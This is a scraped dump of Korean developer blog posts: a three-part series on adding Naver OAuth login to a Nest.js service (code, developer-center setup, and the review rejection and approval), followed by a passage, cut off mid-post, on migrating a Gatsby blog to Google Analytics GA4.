\n위에 나온 것처럼 **로그인 처리가 될 때까지 노출되는 화면**을 단계별로 요구한다.\n\n즉 어떻게 되는지 **플로우**를 제공하면 된다.\n\n난 사진 2장으로 제출했는데 먼저 로그인 화면을 보여줬다.\n\n![](/img07.png)\n\n저기 보면 네이버 로그인이 보인다.  \n그리고 저걸 클릭 했을 때 네이버 쪽으로 요청이 가서 권한을 묻는 화면이 뜨는데 이것도 캡쳐했다.\n\n<br>\n\n![](/img08.png)\n\n<br>\n\n이렇게 하면 끝이다.  \n그리고 마지막 항목만 처리하면 끝이다.\n\n<br>\n\n### 추가 제출 서류 확인\n\n<br>\n\n![](/img09.png)\n\n<br>\n\n여기는 이제 불법적인 요소를 필터링하는 것인데 이 부분은 안되는 것은 아닌데 매우 까다로울 것 같다.  \n다행히 나는 이런 서비스류가 아니라서 없음으로 선택했다.  \n그리고 제출하였다.\n\n제출하면 영업일 기준 2~4일 안으로 응답을 주는 것 같다.  \n근데 위 사진을 본 것처럼... 난 거부를 받았다.\n\n## 왜 거부당하심?\n\n일단 서류 및 제출 내용이 매우 미흡했다.  \n설명이 좀 부족했던 것 같다.\n\n그리고 [흑우집합소](https://bcow.world)의 경우 로또 서비스라서 아무래도 사행성으로 판단할 요소가 있었다.  \n이 부분에 대해 자세히 서술하지 못했다.\n\n일단 내가 받은 부분은 두 가지 지적사항이 있었다.\n\n<br>\n\n### 서비스 내용의 자세한 서술 요청\n\n<br>\n\n![](/img10.png)\n\n<br>\n\n그렇다.  \n<b>\n아무래도 다른 상용 로또 서비스처럼 돈주고 로또 번호를 파는(진짜 이걸 파는 행위도 이해안되고 사는 것도 이해 안되지만...)  \n전자 상거래 서비스로 오인한 듯 싶었다.\n</b>\n\n그래서 이 부분은 아주 장황하게 그리고 자세하게 서술하였다.\n\n<br>\n\n![](/img11.png)\n\n<br>\n\n페이지가 무려 16페이지다...  \n물론 5페이지는 두 번째 받은 내용에 대한 답변이다.\n\n설명을 장황하게 디테일하게... 그리고 사행성 및 전자상거래 요소가 절대 없음을 잘 서술했다.\n\n<br>\n\n### 제공정보 활용목적 확인요청\n\n<br>\n\n![](/img12.png)\n\n위쪽에서...  \n그리고 Part02에서도 언급한 것처럼 꼭 필요한 것만 하라고 한 이유가 이것이다.\n\n난 이메일 내역을 제대로 작성하지 않고 제출했었다.  \n그래서 이런 안내를 받은 것이다.\n\n이 부분은 아래와 같이 답변하였다.\n\n<br>\n\n![](/img13.png)\n\n<br>\n\n## 그 결과...\n\n이렇게 자세하게 그리고 잘 설명을 한 결과....\n\n<br>\n\n![](/img14.png)\n\n<br>\n\n음 대신에 승인되었지만 수정이 필요한 부분이 있다고 한다.  \n권고 내용은 다음과 같았다.\n\n<br>\n\n![](/img15.png)\n\n<br>\n\n그렇다.  \n이메일로는 이용자 식별을 하지 말라고 하는 것이다.\n\n이것은 당연한 것이 요새 SNS 가입할 때 이메일을 제출한다.  \n근데 네이버 가입할 때 A@bcow.world 라 쓰고, 구글에 가입할 때도 A@bcow.world 라고 쓸 수 있다.\n\n이 경우 이메일은 고유 값이 아니게 된다.  \n물론 고유 값을 만들 수 있지만, 메뉴얼 답변에서는 그렇다는 것이다.\n\n난 가입 유형과 별도 키로 회원을 구분하는 것으로 처리했다.  \n길었지만 이렇게 네이버 로그인을 서비스에 잘 붙일 수 있었다.\n\n## 정리\n\n사실 구현이나 하는건 어렵지 않았다.  \n하지만 뭐랄까...\n\n여기까지 안내한 블로그는 내가 찾지 못했다.  \n대부분이 그냥 네아로를 코드에 붙이고, 개발자 페이지에서 등록까지만 설명했으니 말이다.\n\n나도 귀찮았지만...  \n나처럼 해메는 사람이 분명 있을 수 있어서 나는 자세하게 포스팅을 했다.  \n(그리고 사실 글 쓰는게 재미있다(?))\n\n<br>\n\n난 고민했던 요소 중 하나가..  \n서비스 검수 시 내 서비스를 오픈하고 해야 하나...  \n아님 AWS에 검수자만 등록시켜서 볼 수 있게 해야 하나...\n\n이런 쓸모 없는 고민을 했다.  \n아까도 이야기 했지만 일반 사용자는 여러분의 신생 서비스를 알지 못한다.\n\n존재도 모르고 URL도 모른다.  \n그러니까 걱정말고 검수를 잘 받도록 하자.\n\n기타 궁금한 사항 및 기타 사항이 있다면 댓글을 남겨주시면 확인 후 답변 드리도록 하겠다.  \n여러분들의 서비스도 성공해서 잘되셨으면 한다.\n\n<br>\n\n---\n\n#### 네이버 로그인 포스팅 3부작\n\n[Part01 네이버 로그인 구현하기 (Nest.js 코드 구현)](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)  \n[Part02 네이버 로그인 구현하기 (네이버 개발자 센터)](https://elfinlas.github.io/nest_js/230405_naver_login_part02/)  \n[(현재 글) Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험)](https://elfinlas.github.io/nest_js/230405_naver_login_part03/)\n\n---\n\n```toc\n\n```\n"},{"excerpt":"네이버 로그인 포스팅 3부작 Part01 네이버 로그인 구현하기 (Nest.js 코드 구현) (현재 글) Part02 네이버 로그인 구현하기 (네이버 개발자 센터) Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험) 저번에 이어... 저번 포스팅인 Nest.Js에서 네이버 로그인 구현하기 Part.01에 이어서 작성한다. 혹시 코…","fields":{"slug":"/nest_js/230405_naver_login_part02/"},"frontmatter":{"date":"April 05, 2023","title":"Nest.Js에서 네이버 로그인 구현하기 Part.02 (네이버 개발자 센터)","description":null,"tags":["NestJs","OAuth"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n<br>\n\n## 네이버 로그인 포스팅 3부작\n\n[Part01 네이버 로그인 구현하기 (Nest.js 코드 구현)](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)  \n[(현재 글) Part02 네이버 로그인 구현하기 (네이버 개발자 센터)](https://elfinlas.github.io/nest_js/230405_naver_login_part02/)  \n[Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험)](https://elfinlas.github.io/nest_js/230405_naver_login_part03/)\n\n---\n\n<br>\n\n# 저번에 이어...\n\n저번 포스팅인 [Nest.Js에서 네이버 로그인 구현하기 Part.01](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)에 이어서 작성한다.  \n혹시 코드쪽을 안하신 분은 저 포스팅을 참고하도록 하자.\n\n## 네이버 개발자 페이지에서...\n\n[어플리케이션 등록](https://developers.naver.com/apps/#/register?api=nvlogin) 페이지로 이동한다.  \n이동하면 일단 로그인 API 신청을 위한 몇 가지 정보를 입력해야 한다.\n\n![](/img01.png)\n\n<br>\n\n위 사진에서 나온 정보는 따로 설명이 불 필요한 만큼 알아서 작성하자.  \n정보를 다 입력하면 이제 내 어플리케이션에 항목이 등록이 된다.\n\n<br>\n\n### 1. 개요 페이지\n\n![](/img02.png)\n\n<br>\n\n저기서 **ClientID**와 **Client Secret** 항목은 매우 중요하기에 외부로 노출이 안되게, 잘 관리해주자.  \n그리고 저 값은 **Nest.JS** 프로젝트 내에서 심어서 사용할 건데 env파일을 사용한다는 가정하에 설명한다.\n\n프로젝트 내에 **.env**또는 개발환경에 맞는 곳에 다음과 같이 키를 설정해준다.\n\n```\nNAVER_CLIENT_ID = \"CLIENT_ID_NAVER\"\nNAVER_CLIENT_PW = \"12345678ABVDEGG\"\nNAVER_CALLBACK = \"http://localhost:9958/account/login/sns/naver/cb\"\n```\n\n그리고 Part01에서 설명한 것처럼 부모 생성자에게 넘기게끔 설정해준다.  \n코드 쪽은 [Part01](https://elfinlas.github.io/nest_js/230404_naver_login_part01/#3-naver-strategy-수립-및-코드-작성) 이쪽 항목을 참고하자.\n\n```typescript\nsuper({\n  clientID: process.env.NAVER_CLIENT_ID,\n  clientSecret: process.env.NAVER_CLIENT_PW,\n  callbackURL: process.env.NAVER_CALLBACK,\n  passReqToCallback: true,\n})\n```\n\n<br>\n\n### 2. API 설정\n\n![](/img03.png)\n\n저기 안내사항을 한번 읽어본다.  \n그리고 네이버 로그인 제공 정보 선택 부분을 보자.\n\n![](/img04.png)\n\n<br>\n\n여기서 저 정보들은 꼭 필요한 것만 체크해서 쓰자.  \n어짜피 검수 받을 때 안쓰는데도 받으면 검수가 거절된다.\n\n나중에 검수할 때 문서에 이거를 왜 받아야 하는지 서술해야 하기에,  \n가급적 진짜 필요한 것들만 등록해서 쓰자.\n\n만약 과도하게 받고 사용 목적이 불분명하면 승인 거부가 될 수 있다.  \n이와 관련해서는 [Part03 제공정보 활용목적](https://elfinlas.github.io/nest_js/230405_naver_login_part03/#제공정보-활용목적-확인요청) 포스팅을 참고하면 알 수 있다.\n\n나도 과도한 정보 보다는 사이트에서 사용할 필수 정보만 필수로 받게끔 만들어뒀다.\n\n다음은 오픈 API 서비스 환경이다.\n참고로 PC 웹 기준이다.\n\n![](/img05.png)\n\n<br>\n\n개발환경에서는 도메인이 아직 준비가 안되어 있을테니 localhost를 사용해도 무방하다.\n\n**서비스 URL**의 경우 도메인이 준비가 되고,  \n실제 서비스에 올릴 때는 자신의 도메인을 적어준다.\n\n하지만 아직 준비가 안된 경우 http://localhost:9958 이렇게 적어줘도 무방하다.  \n그리고 **Callback URL**의 경우 로그인 후 네이버로부터 정보를 받아올 콜백 URL을 적는 부분이다.\n\n이 부분은 [Nest.Js에서 네이버 로그인 구현하기 Part.01](https://elfinlas.github.io/nest_js/230404_naver_login_part01/#5-컨트롤러-작성) 포스팅의 컨트롤러에서 적은 값을 참고해서 넣는다.\n\n![](/img06.png)\n\n<br>\n\n그 밑은 따로 건들 것은 없다.  \n만약 정보제공동의창 확인이 필요하면 미리보기를 통해 확인할 수 있다.\n\n아직 검수 전이면 어플리케이션 개발 상태의 값은 검수 전으로 표시될 것이다.  \n그리고 네이버 로그인 플러스는 정말 상업용 또는 서비스 규모가 커지거나 전자상거래 쪽으로 갈 경우 유용할 것이다.\n\n하지만...  \n항상 이야기 하지만 서비스 초기는 정말 빈약하고 작은 서비스로 시작한다.  \n아무도 관심도 가지지 않고...\n\n그래서 일단은 저런건 고려하지 말고 기능에 집중하자.\n\n<br>\n\n### 3. 멤버관리\n\n![](/img07.png)\n\n<br>\n\n여기는 같이 공동 개발을 할 경우, 그리고 내부 클로즈에서 테스트가 필요한 경우에 등록하는 부분이다.  \n나는 1인 개발에 로그인 기능은 없이 지인에게 기능을 풀어둬서 이 부분은 따로 등록을 하지 않았었다.\n\n<br>\n\n### 4. 기타\n\n로그인 통계 및 API 통계, Playground는 지금 개발단에서 중요한게 아니라서 일단 넘어간다.\n\n## 정리\n\n여기까지 하면 이제 개발 환경은 다 갖춰졌다.  \n개발할 때 스크린샷을 다 찍지 못해서 네아로 로그인 화면은 못보여드렸다.\n\n궁금하신 분은 직접 구현 또는 [흑우집합소](https://bcow.world)에서 로그인을 해보자(?)  \n사실 네아로 구현이 어렵거나 한 것은 없다.\n\n단지 정책적인 부분을 정하고 구현하는 것이 아주 약간 난해할 뿐...  \n다음 포스팅은 네아로 검수 요청 및 거절된 케이스에 대해서 다뤄볼 예정이다.\n\n<br>\n\n---\n\n#### 네이버 로그인 포스팅 3부작\n\n[Part01 네이버 로그인 구현하기 (Nest.js 코드 구현)](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)  \n[(현재 글) Part02 네이버 로그인 구현하기 (네이버 개발자 센터)](https://elfinlas.github.io/nest_js/230405_naver_login_part02/)  \n[Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험)](https://elfinlas.github.io/nest_js/230405_naver_login_part03/)\n\n---\n\n```toc\n\n```\n"},{"excerpt":"네이버 로그인 포스팅 3부작 (현재 글) Part01 네이버 로그인 구현하기 (Nest.js 코드 구현) Part02 네이버 로그인 구현하기 (네이버 개발자 센터) Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험) 서비스에 SNS 로그인을 구현하려 했다. (SNS Naver OAuth Login) 흑우집합소를 개발하다가 사용자 …","fields":{"slug":"/nest_js/230404_naver_login_part01/"},"frontmatter":{"date":"April 04, 2023","title":"Nest.Js에서 네이버 로그인 구현하기 Part.01 (Naver OAuth Login)","description":null,"tags":["NestJs","OAuth"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n<br>\n\n## 네이버 로그인 포스팅 3부작\n\n[(현재 글) Part01 네이버 로그인 구현하기 (Nest.js 코드 구현)](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)  \n[Part02 네이버 로그인 구현하기 (네이버 개발자 센터)](https://elfinlas.github.io/nest_js/230405_naver_login_part02/)  \n[Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험)](https://elfinlas.github.io/nest_js/230405_naver_login_part03/)\n\n---\n\n<br>\n\n# 서비스에 SNS 로그인을 구현하려 했다. (SNS Naver OAuth Login)\n\n흑우집합소를 개발하다가 사용자 계정 관련해서 사용자 계정과 관련하여 고민을 했다.  \n직접 계정 가입을 받을 것인지... 아니면 SNS를 활용한 계정을 처리할 것인지...\n\n마음은 SNS 로그인쪽으로 기울긴 했다.  \n왜냐하면 직접 받는다면, 계정의 신원을 E-Mail로 잡을텐데 여기서 검증 이메일을 보내는 로직과 더불어,  \n일일히 계정 정보를 다 입력받는 창을 만들고 하면 시간이 너무 많이 먹을 듯 싶었다.\n\n그래서 구글 네이버 카카오를 사용하기로 결정했다.\n\n카카오 사태때 SNS 로그인 문제가 있던걸 봐서 고민을 좀 했지만...  \n이 부분은 내가 따로 구현처리해서 피할 수 있는 것 같아서 SNS 로그인을 선택했다.\n\n내가 직접 한 부분을 다 녹여낸 포스팅이니 참고하면 붙이는데 도움이 되실 것이라 사료된다.\n\n설명에 앞서 Part01에서는 코드 구현부분이 들어가 있다.  \n그리고 Part02에서는 네이버 개발자 센터에서 할 일이 있고,  \nPart03에서는 몇 가지 정리할 내용들이 들어간다.\n\n## 뭐 먼저 할까?\n\n코딩적인 부분은 그냥 쉽게쉽게 하던대로 하면 편하지만, 네이버 개발자 센터가 약간 귀찮다.  \n아래 순서로 진행해보자.\n\n### 1. Nest.Js에 라이브러리 설치\n\n먼저 아래의 패키지들을 설치해주자.\n\n```\nyarn add @nestjs/passport\nyarn add passport\nyarn add passport-naver-v2\n```\n\n뭐 npm을 쓰면 npm으로 바꿔서 설치하면 된다.  \n참고로 [passport-naver-v2](https://www.npmjs.com/package/passport-naver-v2)는 네이버에서 구현한 passport-naver를 개량한 버전이다.  \n네이버에서 만든게 아니라 개인이 만드신 듯 하다.\n\n<br>\n\n### 2. Naver AuthGuard 작성\n\n이제 AuthGuard를 작성해야 한다.  \nNest.Js에서 AuthGuard에 대해서는 추후 포스팅하고 여기에 업데이트 하도록 하겠다.\n\n아래 나오는 것은 샘플 코드이므로 본인의 취향에 맞게 작성해도 된다.  \n여기 나온 코드나 위치는 참고만...\n\n```typescript\nimport { ExecutionContext, Injectable } from '@nestjs/common';\nimport { AuthGuard } from '@nestjs/passport';\n\n@Injectable()\nexport class NaverAuthGuard extends AuthGuard('naver') {\n  constructor() {\n    super();\n  }\n\n  handleRequest<TUser = any>(err: any, user: any, info: any, context: ExecutionContext, status?: any): TUser {\n    //에러가 존재하면 에러 처리로 넘긴다.\n    if (err || !user) {\n      throw err;\n    }\n    return user;\n  }\n}\n```\n\n**handleRequest**메서드의 경우 저 nestjs의 AuthGuard의 선언된 타입 중 하나를 구현한 것이다.  \n그래서 만약 처리 중 에러가 발생할 경우 에러 자체를 넘겨서 처리할 수 있도록 했다.\n\n아래 원형을 참고하자.\n\n```typescript\nexport declare type IAuthGuard = CanActivate & {\n  logIn<\n    TRequest extends {\n      logIn: Function;\n    } = any,\n  >(\n    request: TRequest,\n  ): Promise<void>;\n  handleRequest<TUser = any>(err: any, user: any, info: any, context: ExecutionContext, status?: any): TUser;\n  getAuthenticateOptions(context: ExecutionContext): IAuthModuleOptions | undefined;\n};\nexport declare const AuthGuard: (type?: string | string[]) => Type<IAuthGuard>;\n```\n\n에러는 보통 ExceptionHandler로 처리를 할텐데 이 부분에 대해서는 각자 처리하는 방식이 있기에,  \n여기서는 논외로 하겠다.\n\n<br>\n\n### 3. Naver Strategy 수립 및 코드 작성\n\n**Strategy**의 경우에도 nest.js의 전략(Strategy)를 받아서 구현하는데,  \n이 부분도 향후에 다시 다뤄볼 예정이다.\n\n일단 내가 구현한 Naver Strategy 코드는 다음과 같다.  \n보안을 위해 일부 코드는 누락되어 있으니 참고만 하자.\n\n```typescript\nimport { Inject, Injectable } from '@nestjs/common'\nimport { PassportStrategy } from '@nestjs/passport'\nimport { Request } from 'express'\nimport { Profile, Strategy } from 'passport-naver-v2'\nimport { AccountErrorCode } from 'src/domain/account/exceptions/account.error.code'\nimport { AccountException } from 'src/domain/account/exceptions/account.exception'\nimport {\n  IsExistAccountInboundPort,\n  IS_EXIST_ACCOUNT_INBOUND_PORT,\n} from 'src/domain/account/ports/in/is.exist.account.inbound.port'\nimport {\n  JoinAccountInboundPort,\n  JOIN_ACCOUNT_INBOUND_PORT,\n} from 'src/domain/account/ports/in/join.account.inbound.port'\nimport {\n  LoginAccountInboundPort,\n  LOGIN_ACCOUNT_INBOUND_PORT,\n} from 'src/domain/account/ports/in/login.account.inbound.port'\nimport {\n  ACCOUNT_FIND_TYPE,\n  ACCOUNT_JOIN_TYPE,\n  ACCOUNT_STATUS_TYPE,\n} from 'src/domain/account/types/account.enums'\nimport {\n  CreateJwtOutboundPort,\n  CREATE_JWT_OUTBOUND_PORT,\n} from '../ports/out/jwt/create.jwt.outbound.port'\nimport { SnsLoginOutputDto } from '../types/strategy.type'\nimport { snsAccountJoin } from './helper/join.account.helper'\nimport { snsLoginAccount } from './helper/sns.login.helper'\nimport { makeNickName } from 'src/domain/account/utils/make.nickname.util'\nimport {\n  IsResignAccountInboundPort,\n  IS_RESIGN_ACCOUNT_INBOUND_PORT,\n} from 'src/domain/account/ports/in/is.resign.account.inbound.port'\n\n@Injectable()\nexport class NaverOAuthStrategy extends PassportStrategy(Strategy, 'naver') {\n  constructor(\n    @Inject(JOIN_ACCOUNT_INBOUND_PORT)\n    private readonly joinAccountOutboundPort: JoinAccountInboundPort,\n    @Inject(LOGIN_ACCOUNT_INBOUND_PORT)\n    private readonly loginAccountInboundPort: LoginAccountInboundPort,\n\n    @Inject(IS_EXIST_ACCOUNT_INBOUND_PORT)\n    private readonly isExistAccountInboundPort: IsExistAccountInboundPort,\n    @Inject(CREATE_JWT_OUTBOUND_PORT)\n    private readonly createJwtOutboundPort: CreateJwtOutboundPort,\n    @Inject(IS_RESIGN_ACCOUNT_INBOUND_PORT)\n    private readonly isResignAcountInbound: IsResignAccountInboundPort\n  ) {\n    super({\n      clientID: process.env.NAVER_CLIENT_ID,\n      clientSecret: process.env.NAVER_CLIENT_PW,\n      callbackURL: process.env.NAVER_CALLBACK,\n      passReqToCallback: true,\n    })\n  }\n\n  async validate(\n    req: Request,\n    accessToken: string,\n    refreshToken: string,\n    profile: Profile\n  ): Promise<SnsLoginOutputDto> {\n    const { email } = profile\n\n    if (email === undefined) {\n      return {\n        email: undefined,\n        joinType: undefined,\n        lastLoginInfo: undefined,\n        accessToken: undefined,\n        bcode: undefined,\n      }\n    }\n\n    //탈퇴 6개월 이내를 체크한다.\n    const isResignAccount = await this.isResignAcountInbound.excute({\n      email,\n      joinType: ACCOUNT_JOIN_TYPE.SNS_GOOGLE,\n    })\n    if (isResignAccount.isResign) {\n      throw new AccountException(AccountErrorCode.AccessResignAccount())\n    }\n\n    //계정이 존재하는지 체크\n    const isExistAccountType = await this.isExistAccountInboundPort.excute({\n      email,\n      joinType: ACCOUNT_JOIN_TYPE.SNS_NAVER,\n    })\n\n    //회원이 가입 안된 상태 => 회원 가입 진행\n    if (isExistAccountType.findType === ACCOUNT_FIND_TYPE.NO_EXIST) {\n      //회원가입 진행 로직 수행\n      return snsAccountJoin({...})\n    }\n    //이미 계정이 존재 => 로그인\n    else if (isExistAccountType.findType === ACCOUNT_FIND_TYPE.EXIST) {\n      return snsLoginAccount({...})\n    }\n  }\n}\n```\n\n상단의 **PassportStrategy(Strategy, 'naver')**클래스를 상속받아서,  \n**validate**메서드에서 실질적인 구현을 한다.\n\n**PassportStrategy**의 경우 **Strategy**와 구분자 이름을 받는다.  \n여기는 깊게 갈 필요는 없고, Strategy는 **passport-naver-v2**의 값을 넣는다.\n\n그리고 생성자에서 부모 생성자에게 넘길 인자로 네이버 개발자 센터에서 값을 받아와야 하는데,  \n이 부분은 일단 공백으로 둬도 된다.\n\n```\nsuper({\n      clientID: process.env.NAVER_LOGIN_CLIENT_ID,\n      clientSecret: process.env.NAVER_LOGIN_CLIENT_PW,\n      callbackURL: process.env.NAVER_LOGIN_CALLBACK,\n      passReqToCallback: true,\n    })\n```\n\n지금 작성된 코드의 경우 내가 구현한 것이라서 env파일에서 값을  \n끌어오지만 실제로 구현할 때는 잠시 공백으로 둬도 된다.\n\n**passReqToCallback**옵션의 경우 req객체 접근 여부인데,  \n나는 req에 실어나를 데이터가 있어서 true로 했다.\n\n**validate**메서드의 전달인자에는 다음과 같이 되어 있다.\n\n```\nreq: Request,\naccessToken: string,\nrefreshToken: string,\nprofile: Profile\n```\n\nreq는 express Request 객체고, accessToken과 refreshToken의 경우 네이버에서 제공하는 토큰이다.  \n이걸로 사용자 인증을 사용해도 되고, 나처럼 직접 JWT 토콘을 사용하여 구현해도 된다.\n\nNest.Js에서 Jwt 사용이 궁금한 분은 [이곳 포스팅(Nest.Js에서 JWT 사용하기)](https://elfinlas.github.io/nest_js/230208_nesjs_jwt_part1/)을 참고하자.\n\n그리고 마지막으로 profile의 경우 네이버 로그인을 통해 동의받은 사용자 정보를 받는 부분이다.  \n값은 아래를 참고하자.\n\n```typescript\nexport type Profile = {\n  provider: 'naver';\n  id: string;\n  nickname?: string;\n  profileImage?: string;\n  age?: string;\n  gender?: string;\n  email?: string;\n  mobile?: string;\n  mobileE164?: string;\n  name?: string;\n  birthday?: string;\n  birthYear?: string;\n  _raw: string;\n  _json: string;\n};\n```\n\n<br>\n\n### 4. 로그인 전략 수립 (생각 및 고민해볼 부분)\n\n개발자가 신경 쓸 부분은 전략부분이다.  \n사용자가 네이버 로그인을 시 **profile**객체 값을 통해 이메일 정보를 알아낼 수 있을 것이다.\n\n그럼 이 이메일 정보를 토대로 이미 가입이 되어 있는 계정인지...  \n아니면 가입이 안되어 있는 계정인지를 확인할 수 있다.\n\n그래서 위 코드에서도 조회를 해서 가입 처리 또는 로그인 처리를 진행한다.  \n참고로 회원 가입 시 몇 가지 정할 것이 있다.\n\n다중 계정 허용을 할 것인지, 아니면 다중 계정을 막을지,  \n이 부분은 향후 포스팅에서 다루겠다.\n\n일단은 난 다중 계정은 허용하는 방향으로 갔지만,  \n다중 게정을 직접적으로 이용하는 것은 막는 방향으로 갔다.\n\n그리고 만약 탈퇴한 회원이 재가입 하는 경우도 생각해 볼 수 있겠다.\n\n무튼 이 부분은 프로젝트 성향에 따라 다르기 때문에 각자 알맞게 구현해서 가도록 하자.\n\n<br>\n\n### 5. 컨트롤러 작성\n\n컨트롤러는 별거 없다.  \n아래의 코드를 참고하자.\n\n참고로 여기에서 쓰이는 주소 값은 나중에 네이버 개발자 센터에서 사용해야 한다.  \n이 부분은 Part02 포스트를 참고하자.\n\n```typescript\nimport { Controller, Get, Inject, Req, Res, UseFilters, UseGuards } from '@nestjs/common';\nimport { Request, Response } from 'express';\nimport { AuthExceptionHandler } from 'src/domain/auth/exceptions/auth.exception.handle';\nimport { NaverAuthGuard } from 'src/domain/auth/guard/naver.guard';\nimport { CustomLoggerService } from 'src/domain/logger/services/custom.logger';\nimport { AccountExceptionHandler } from '../../exceptions/account.exception.handler';\nimport { ACCOUNT_JOIN_TYPE } from '../../types/account.enums';\nimport LoginControllerHelper from './login.controller.helper';\n\n@Controller('account')\nexport class LoginSnsNaverController extends LoginControllerHelper {\n  constructor(@Inject(CustomLoggerService) readonly logger: CustomLoggerService) {\n    super(logger);\n  }\n\n  @Get('login/sns/naver')\n  @UseGuards(NaverAuthGuard)\n  async snsLogin4Naver() {}\n\n  @Get('login/sns/naver/cb')\n  @UseGuards(NaverAuthGuard)\n  @UseFilters(AccountExceptionHandler)\n  @UseFilters(AuthExceptionHandler)\n  async snsLogin4NaverCallBack(@Req() req: any, @Res() res: Response) {\n    const redirectUrl = this.loginCallback(req, res, ACCOUNT_JOIN_TYPE.SNS_NAVER);\n    return res.redirect(redirectUrl);\n  }\n}\n```\n\n**@Get('login/sns/naver')** 접근 시 네이버의 로그인 쪽으로 가게 된다.  \n그래서 여기는 뭔가 따로 처리할 것은 없다.\n\n그리고 **@Get('login/sns/naver/cb')**콜백을 받는 부분은 아까 Strategy쪽에서 언급한 바와 같이,  \nreq 객체에 로그인 또는 회원 가입한 정보를 담고 있다.\n\n아래와 같이 한번 콘솔을 찍어보면 된다.\n\n```typescript\nconsole.log('req = ', req.user);\n```\n\n물론 저 Strategy쪽에서 return할 때 {} 와 같이 객체로 만들어 보내면 된다.  \n일단 이렇게 하면 코드에서 할 부분은 끝이다.\n\n## 정리\n\n코드쪽은 위에서 언급한 바와 같이 그렇게 복잡한 것이 없다.\n\n단지 프로젝트 성향에 따라 다중 계정 및 회원 가입, 로그인 처리,  \n그리고 사용자 인증을 위한 토큰 처리 정도?\n\n만약 accessToken 및 refreshToken을 직접 구현하는게 아니라,  \n네이버에게 위임하여 구현할 겅우 [접근 토큰을 이용하여 프로필 API 호출](https://developers.naver.com/docs/login/devguide/devguide.md#3-4-5-접근-토큰을-이용하여-프로필-api-호출하기) 문서를 확인하자.\n\n다음은 네이버 개발자 페이지에서 처리할 것을 다루는 포스팅으로 넘어간다.\n\n<br>\n\n---\n\n#### 네이버 로그인 포스팅 3부작\n\n[(현재 글) Part01 네이버 로그인 구현하기 (Nest.js 코드 구현)](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)  \n[Part02 네이버 로그인 구현하기 (네이버 개발자 센터)](https://elfinlas.github.io/nest_js/230405_naver_login_part02/)  \n[Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험)](https://elfinlas.github.io/nest_js/230405_naver_login_part03/)\n\n---\n\n<br>\n\n```toc\n\n```\n"},{"excerpt":"간만에 구글 애널리틱스에 가보니... 티스토리나 알려진 블로그 플랫폼은 Google Analytics의 연결이 매우 편리하게 되어있다. 하지만 그외 플랫폼은 직접 연결을 해줘야 한다. 사실 붙여놓고 잘 안들어갔다. 내 개인 블로그를 많이 와주면 고맙겠지만, 이런거 일일히 신경쓰면 피곤하다. 그래서 오면 오고 안오면 안오나보다 하고 하는게 맘 편하다. 그리…","fields":{"slug":"/gatsby/230404_google_analytics/"},"frontmatter":{"date":"April 04, 2023","title":"Gasty에서 구글 애널리틱스 GA4 처리 문제","description":null,"tags":["Gatsby","SEO","Google Analytics"],"series":"Gatsby","previewImage":"gatsby_logo.png","isPrivate":null},"rawMarkdownBody":"\n![mhlab](/thumbnail.png)\n\n# 간만에 구글 애널리틱스에 가보니...\n\n티스토리나 알려진 블로그 플랫폼은 Google Analytics의 연결이 매우 편리하게 되어있다.  \n하지만 그외 플랫폼은 직접 연결을 해줘야 한다.\n\n사실 붙여놓고 잘 안들어갔다.  \n내 개인 블로그를 많이 와주면 고맙겠지만, 이런거 일일히 신경쓰면 피곤하다.\n\n그래서 오면 오고 안오면 안오나보다 하고 하는게 맘 편하다.  \n그리고 내가 무슨 네임드 개발자도 아니고, 그냥 삽질하고, 경험한거 쓰는 블로그인데 뭐...\n\n그래도 궁금한거 댓글 남기거나 하면 바로바로 답은 해주려고 노력하는 편이다.\n\n서두가 길었다.  \n어느날부터인가...\n\n애널리틱스 사이트에 들어갔더니 아래처럼 뭔가 떴다.\n\n![](/img01.png)\n\n지금이 벌써 23년 4월이니 이제 준비를 안하면 이 집계도 못사용하겠다 싶어서 바꿔봤다.  \n근데 내가 쓰는건 만든이가 더 이상 관리하지 않는 오픈소스 테마였기에...\n\n문제가 있으면 스스로 고쳐서 써야하는 상황이다.  \n그래서 그냥 애널리틱스 ID만 바꾸면 쉽게 해결될 것 같아서 **gatsby-meta-config.js**에서 ga 값만 변경해봤다.\n\n근데 수신을 못해서 계속 페이지에서 데이터 송수신 자료가 없다고 했다.\n\n## 뭐가 문제일까?\n\n먼저 내 테마의 깃허브 이슈를 봤지만...  \n역시 관리를 하지 않고, 거의 개인적으로 업데이트 또는 커스터마이징 해서 쓰느라 최신 글도 없었다.\n\n그래서 구글에 좀 찾아보니 **Gatsby** 깃헙에서 약간의 힌트를 찾을 수 있었다.  \n[여기 이슈 27627](https://github.com/gatsbyjs/gatsby/issues/27627)에 의하면 **Not updated for New Google Analytics**  \n즉 최신 구글 애널리틱스가 업데이트 되지 않는다고 한다.  \n나랑 증상이 같은 것이다.\n\n그 중 **rajatrao777**라는 외쿸 성님이 아래와 같이 답을 남겼다.\n\n![](/img02.png)\n\n<br>\n\n요약하면 Gatsby 플러그인 중 **google-tag** 플러그인이 이제는 지원하지 않아서,  \n새로운 플러그인인 [gatsby-plugin-gtag](https://www.gatsbyjs.com/plugins/gatsby-plugin-gtag/)을 사용하라는 것이다.\n\n## 그래서 적용은 어떻게?\n\n이것도 쉽다.  \n아래의 순서대로 하나씩 따라 해보자.\n\n### 1. 기존 플러그인 삭제\n\n먼저 기존에 쓰던 플러그인은 제거하자.\n\n```\nnpm remove gatsby-plugin-google-analytics\n```\n\n그리고 **gatsby-config.js**파일에서 아래 설정을 지워주자.  \n아니면 주석 처리를 해도 되지만 혹시 모르니...\n\n```\n{\n      resolve: `gatsby-plugin-google-analytics`,\n      options: {\n        //etc option\n      